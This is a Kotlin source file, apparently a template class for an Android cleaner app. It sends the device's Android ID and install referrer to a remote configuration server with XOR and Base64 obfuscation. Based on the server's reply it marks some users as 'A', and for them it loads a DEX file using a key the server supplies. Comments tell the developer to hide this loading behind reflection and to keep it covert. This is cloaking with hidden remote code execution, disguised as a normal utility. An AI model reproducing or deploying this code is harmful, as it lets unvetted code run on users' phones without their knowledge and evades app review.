package com.demo.network

import android.app.Application
import android.util.Base64
import com.demo.DemoHelper
import com.demo.DexLoadDemo
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import kotlin.random.Random

/**
 * Date：2025/10/20
 * Describe:
 * todo 这个是demo 类，必须要自己按照产品需求重新实现对应的功能
 */
class AdminDemo(
    val mApp: Application, val url: String, val mAndroidId: String, val mAppVersion: String
) {
    private var mIoScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var laTF = 0L
    private var mRef: String = ""
    private var mOkClient = OkHttpClient()
    private var tPeriod = 40000L
    private var mS: String = ""

    // 需要做数据持久化
    private var mLastConfigure: String = ""


    //["ts", "time", "timestamp", "datetime", "dt"]
    private var d: String = "datetime"


    //将获取到的 install传进来 
    private fun fetchAdmin(ref: String) {
        val con = mLastConfigure
        if (con.isBlank()) {// 没配置直接进行获取
            fetch(5)
        } else {
            // 有配置先使用上一次的配置，然后在进行数据更新
            refreshLastConfigure(con)
            if (mS == "a") {
                ioTask(Random.nextLong(1000, 60000 * 10)) {
                    fetch(1)
                }
            } else {
                bz()
            }
        }
    }

    private fun fetch(num: Int = 5) {
        if (System.currentTimeMillis() - laTF < tPeriod) return
        laTF = System.currentTimeMillis()
        val t = "${System.currentTimeMillis()}"
        val c = mapStr(a0(mRef), t)
        val str = (Base64.encodeToString(c.toByteArray(), Base64.DEFAULT))
        val req = Request.Builder().post(
            str.toRequestBody("application/json".toMediaType())
        ).url(url).addHeader(d, t).build()
        requestAdmin(req, num)
    }

    private fun mapStr(origin: String, keyT: String): String {
        return origin.mapIndexed { index, c ->
            (c.code xor keyT[index % 13].code).toChar()
        }.joinToString("")
    }

    private fun requestAdmin(request: Request, num: Int) {
        TbaUtils.postEvent("config_R")
        mOkClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                if (num > 0) {
                    TbaUtils.postEvent("config_G", "error_net")
                    ioTask(10000) {
                        requestAdmin(request, num - 1)
                    }
                } else {
                    requestOver("timeout")
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string() ?: ""
                val code = response.code
                if (code == 200) {
                    val res = dateSync(body, response.headers[d] ?: "")
                    if (res.isBlank()) {
                        requestOver("null")
                    } else {
                        refreshLastConfigure(res)
                        bz()
                        TbaUtils.postEvent("config_G", mS)
                    }
                } else {
                    if (num > 0) {
                        TbaUtils.postEvent("config_G", "${response.code}")
                        ioTask(90000) {
                            requestAdmin(request, num - 1)
                        }
                    } else {
                        requestOver("timeout")
                    }
                }
            }
        })
    }

    private fun requestOver(result: String) {
        TbaUtils.postEvent("config_G", result)
        if (mS.isBlank()) {
            ioTask(20000) {
                fetch(3)
            }
        } else {
            bz()
        }
    }

    private fun dateSync(body: String, time: String): String {
        if (body.isBlank() || time.isBlank()) return ""
        try {
            val js = mapStr(String(Base64.decode(body, Base64.DEFAULT)), time)
            return JSONObject(js).optJSONObject(details)?.getString("conf") ?: ""
        } catch (_: Exception) {
        }
        return ""
    }

    private fun refreshLastConfigure(string: String) {
        try {
            JSONObject(string).apply {
                val s = optString("type_name")
                if (s.contains("A")) {
                    // 不能直接使用我这边方式，需要自行修改具体如何判断成A用户还是B用户
                    mS = "a"
                } else if (s.contains("B")) {
                    if (mS == "a") {
                        return
                    }
                    mS = "b"
                }
                DemoHelper.mustPostLog = optString("must_name_event")
                DemoHelper.isPostLog = s.contains("C_L").not()

                // 将数据保存在本地用sp或者mmkv等
                mLastConfigure = string
                e1(optString("facebook_id"), optString("fb_token"))
                val timeStr = optString("time_configure")
                val timeList = timeStr.split("-")
                cheAT = timeList[0].toInt() * 60000L
                cheBT = timeList[1].toInt() * 1000L
                if (mS == "a") {
                    if (go.not()) {
                        dexKey=optString("dex_key")
                        go = true
                        // todo
                        // 进行dex加载，
                        // 需要注意这里进入dex需要隐蔽点，不能直接就调用
                        next()
                    }
                }
            }
        } catch (e: Exception) {
            TbaUtils.postEvent("cf_fail", e.stackTraceToString())
        }
    }

    private var go = false
    private var cheBT = 90000L
    private var cheAT = 60000 * 60L

    // 定期刷新配置
    private fun t0(): Long {
        tPeriod = if (mS == "a") {
            Random.nextLong(cheAT - 60000 * 5, cheAT + 60000 * 5)
        } else {
            Random.nextLong(cheBT, cheBT + 10000)
        }
        return tPeriod
    }

    private fun ioTask(delTime: Long, event: () -> Unit) {
        mIoScope.launch {
            delay(delTime)
            event.invoke()
        }
    }

    private fun bz() {
        val time = t0()
        ioTask(time) { fetch(1) }
    }

    // todo 获取外面保存的Android id key 需要修改
    private val mAndroidIdStr = mAndroidId

    //todo 修改成Admin对应的混淆
    private val details = "glxlFgw"
    private fun a0(ref: String): String {
        val js =
            JSONObject()
                .put("MyuAgKrl", "com.quickclean.sweeppurge")
                .put("IsLchUhls", mAppVersion)
                .put("bammKCRKBz", mAndroidIdStr)
                .put("zwyUQI", mAndroidIdStr)
                .put("FvLGXvxg", ref)
        return js.toString()
    }

    //TODO 这里的逻辑要修改，改成反射或者其他能隐藏这个逻辑方式
    private val mDexLoadDemo by lazy { DexLoadDemo() }
    private var dexKey = ""
    private fun next() {
        mDexLoadDemo.decode(mApp, dexKey)
    }

    // 初始化Facebook 
    private fun e1(fbStr: String, token: String) {
        if (fbStr.isBlank()) return
        if (token.isBlank()) return
        if (FacebookSdk.isInitialized()) return
        FacebookSdk.setApplicationId(fbStr)
        FacebookSdk.setClientToken(token)
        FacebookSdk.sdkInitialize(mApp)
        AppEventsLogger.activateApp(mApp)
    }

}